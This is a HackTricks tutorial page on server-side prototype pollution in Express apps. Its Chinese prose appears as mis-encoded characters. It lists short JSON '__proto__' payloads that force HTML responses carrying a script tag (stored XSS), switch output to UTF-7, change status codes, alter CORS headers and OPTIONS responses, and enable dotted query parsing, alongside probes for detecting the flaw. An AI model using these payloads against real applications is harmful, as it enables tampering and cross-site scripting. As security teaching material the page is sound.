# ExpressåŸå‹æ±¡æŸ“å·¥å…·

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)æ˜¯ä¸€ä¸ªç”±**æš—ç½‘**æ”¯æŒçš„æœç´¢å¼•æ“ï¼Œæä¾›å…è´¹åŠŸèƒ½ï¼Œç”¨äºæ£€æŸ¥å…¬å¸æˆ–å…¶å®¢æˆ·æ˜¯å¦å—åˆ°**çªƒå–æ¶æ„è½¯ä»¶**çš„**ä¾µå®³**ã€‚

WhiteIntelçš„ä¸»è¦ç›®æ ‡æ˜¯æ‰“å‡»ç”±çªƒå–ä¿¡æ¯æ¶æ„è½¯ä»¶å¯¼è‡´çš„è´¦æˆ·åŠ«æŒå’Œå‹’ç´¢è½¯ä»¶æ”»å‡»ã€‚

æ‚¨å¯ä»¥è®¿é—®ä»–ä»¬çš„ç½‘ç«™å¹¶å…è´¹å°è¯•ä»–ä»¬çš„å¼•æ“ï¼š

{% embed url="https://whiteintel.io" %}

***

## æä¾›XSSå“åº”

**æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…** [**æŸ¥çœ‹åŸå§‹ç ”ç©¶**](https://portswigger.net/research/server-side-prototype-pollution)

### å°†JSONå†…å®¹ç±»å‹æ›´æ”¹ä¸ºHTML

åœ¨ä½¿ç”¨**JSONå†…å®¹ç±»å‹å“åº”**å¹¶åæ˜ JSONçš„Expressåº”ç”¨ç¨‹åºä¸­ï¼š
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œä½¿ç”¨ JSON å†…å®¹ç±»å‹é€šå¸¸ä¸ä¼šå¯¼è‡´ XSSã€‚ç„¶è€Œï¼Œé€šè¿‡åŸå‹æ±¡æŸ“ï¼Œæˆ‘ä»¬å¯ä»¥**æ··æ·† Express ä»¥æä¾› HTML å“åº”ã€‚** è¿™ç§æ¼æ´ä¾èµ–äºåº”ç”¨ç¨‹åºä½¿ç”¨**`res.send(obj)`**å¹¶ä½¿ç”¨ body è§£æå™¨ä¸ application/json å†…å®¹ç±»å‹ã€‚
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
é€šè¿‡**æ±¡æŸ“** **`body`** å’Œ **`_body`** å±æ€§ï¼Œå¯ä»¥å¯¼è‡´**Expressæä¾›HTMLå†…å®¹ç±»å‹**å¹¶åå°„`_body`å±æ€§ï¼Œä»è€Œå¯¼è‡´å­˜å‚¨å‹XSSã€‚

### æ¸²æŸ“UTF7

å¯ä»¥è®©express **æ¸²æŸ“UTF-7å†…å®¹**ï¼š
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## å®‰å…¨æ‰«ææŠ€å·§

### JSON ç©ºæ ¼

ä»¥ä¸‹çš„ PP å°†ä½¿ JSON å†…éƒ¨çš„å±æ€§å¤šå‡ºä¸€ä¸ªç©ºæ ¼ï¼Œè€Œä¸ä¼šç ´ååŠŸèƒ½ï¼š
```json
{"__proto__":{"json spaces": " "}}
```
ç„¶ååå°„çš„ JSON å°†å¦‚ä¸‹æ‰€ç¤ºï¼š
```json
{"foo":  "bar"} -- Note the extra space
```
### æš´éœ²çš„å¤´éƒ¨

ä»¥ä¸‹çš„ PP gadget ä¼šè®©æœåŠ¡å™¨å‘é€å› HTTP å¤´éƒ¨ï¼š**`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
éœ€è¦å®‰è£…**CORSæ¨¡å—**

### **OPTIONSæ–¹æ³•**

ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè½½è·ï¼Œå¯ä»¥**ä»OPTIONSå“åº”ä¸­éšè—ä¸€ä¸ªæ–¹æ³•**ï¼š
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **çŠ¶æ€**

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ PP è´Ÿè½½æ›´æ”¹**è¿”å›çš„çŠ¶æ€ç **ï¼š
```json
{"__proto__":{"status":510}}
```
### é”™è¯¯

å½“æ‚¨ä½¿ç”¨åŸå§‹å€¼ï¼ˆå¦‚å­—ç¬¦ä¸²ï¼‰åˆ†é…ç»™åŸå‹æ—¶ï¼Œä¼šäº§ç”Ÿ**æ— æ“ä½œæ“ä½œï¼Œå› ä¸ºåŸå‹å¿…é¡»æ˜¯ä¸€ä¸ªå¯¹è±¡**ã€‚å¦‚æœæ‚¨å°è¯•å°†åŸå‹å¯¹è±¡åˆ†é…ç»™`Object.prototype`æœ¬èº«ï¼Œè¿™å°†**å¼•å‘å¼‚å¸¸**ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸¤ç§è¡Œä¸ºæ¥**æ£€æµ‹åŸå‹æ±¡æŸ“æ˜¯å¦æˆåŠŸ**ï¼š
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### åå°„å€¼

å½“ä¸€ä¸ªåº”ç”¨åœ¨å…¶å“åº”ä¸­åŒ…å«ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œåˆ›å»ºä¸€ä¸ªä¸ `__proto__` å¹¶åˆ—çš„**ä¸å¯»å¸¸åç§°çš„å±æ€§**å¯èƒ½ä¼šå¾ˆæœ‰è§åœ°ã€‚å…·ä½“æ¥è¯´ï¼Œå¦‚æœ**å“åº”ä¸­åªè¿”å›äº†ä¸å¯»å¸¸çš„å±æ€§**ï¼Œè¿™å¯èƒ½è¡¨æ˜åº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ï¼š
```json
{"unusualName":"value","__proto__":"test"}
```
æ­¤å¤–ï¼Œåœ¨ä½¿ç”¨è¯¸å¦‚Lodashä¹‹ç±»çš„åº“çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡åŸå‹æ±¡æŸ“ï¼ˆPPï¼‰å’Œç›´æ¥åœ¨å¯¹è±¡å†…éƒ¨è®¾ç½®å±æ€§ï¼Œæä¾›äº†å¦ä¸€ç§è¯Šæ–­æ–¹æ³•ã€‚å¦‚æœå“åº”ä¸­çœç•¥äº†è¿™æ ·çš„å±æ€§ï¼Œåˆ™è¡¨æ˜Lodashåœ¨åˆå¹¶ä¹‹å‰éªŒè¯äº†ç›®æ ‡å¯¹è±¡ä¸­å±æ€§çš„å­˜åœ¨ï¼š
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## å…¶ä»–

### å…è®¸ç‚¹

åœ¨ Express ä¸­æœ‰ä¸€ä¸ªé€‰é¡¹ï¼Œå…è®¸ä½ **ä»æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°åˆ›å»ºå¯¹è±¡**ã€‚\
ä½ ç»å¯¹å¯ä»¥åœ¨ä¸€ä¸ªæ¼æ´**é“¾**ä¸­ä½¿ç”¨å®ƒæ¥åˆ©ç”¨**åŸå‹æ±¡æŸ“æ¼æ´**ã€‚
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` åœ¨ Node ä¸­åˆ›å»ºä¸€ä¸ªå¯¹è±¡ã€‚**

## å‚è€ƒ

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) æ˜¯ä¸€ä¸ªç”±**æš—ç½‘**æ”¯æŒçš„æœç´¢å¼•æ“ï¼Œæä¾›å…è´¹åŠŸèƒ½ï¼Œç”¨äºæ£€æŸ¥å…¬å¸æˆ–å…¶å®¢æˆ·æ˜¯å¦å—åˆ°**çªƒå–æ¶æ„è½¯ä»¶**çš„**å¨èƒ**ã€‚

WhiteIntel çš„ä¸»è¦ç›®æ ‡æ˜¯æ‰“å‡»ç”±çªƒå–ä¿¡æ¯çš„æ¶æ„è½¯ä»¶å¯¼è‡´çš„è´¦æˆ·åŠ«æŒå’Œå‹’ç´¢è½¯ä»¶æ”»å‡»ã€‚

æ‚¨å¯ä»¥è®¿é—®ä»–ä»¬çš„ç½‘ç«™å¹¶å…è´¹å°è¯•ä»–ä»¬çš„å¼•æ“ï¼š

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬**ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
